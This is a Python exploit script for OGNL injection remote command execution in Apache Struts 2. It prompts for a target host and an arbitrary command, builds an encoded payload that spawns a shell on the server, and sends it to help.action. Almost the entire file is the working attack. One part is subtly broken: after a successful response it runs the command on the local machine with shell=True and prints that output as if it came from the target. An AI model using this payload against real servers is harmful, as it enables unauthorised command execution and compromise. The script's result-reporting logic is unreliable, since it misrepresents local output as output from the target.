#!/usr/bin/python
# -*- coding: utf-8 -*-

# hook-s3c (github.com/hook-s3c), @hook_s3c on twitter

import requests
import subprocess

def exploit():
    host = input("Please enter the target host and port (e.g. example.com:8080): ")
    cmd = input("Please enter the command to execute: ")

    print("[Execute]: {}".format(cmd))

    ognl_payload = "${"
    ognl_payload += "(#_memberAccess['allowStaticMethodAccess']=true)."
    ognl_payload += "(#cmd='{}').".format(cmd)
    ognl_payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    ognl_payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'bash','-c',#cmd}))."
    ognl_payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    ognl_payload += "(#p.redirectErrorStream(true))."
    ognl_payload += "(#process=#p.start())."
    ognl_payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    ognl_payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    ognl_payload += "(#ros.flush())"
    ognl_payload += "}"

    if not ":" in host:
        host = "{}:8080".format(host)

    # encode the payload
    ognl_payload_encoded = requests.utils.quote(ognl_payload)

    # further encoding
    url = "http://{}/{}/help.action".format(host, ognl_payload_encoded.replace("+","%20").replace(" ", "%20").replace("%2F","/"))

    print("[Url]: {}\n\n\n".format(url))

    try:
        response = requests.get(url, timeout=5)
    except requests.exceptions.RequestException as e:
        print(e)
        return

    if response.status_code == 200:
        # 使用subprocess库执行命令
        output = subprocess.check_output(cmd, shell=True)
        print(output)
    else:
        print("[ERROR]: Payload failed to execute.")

exploit()
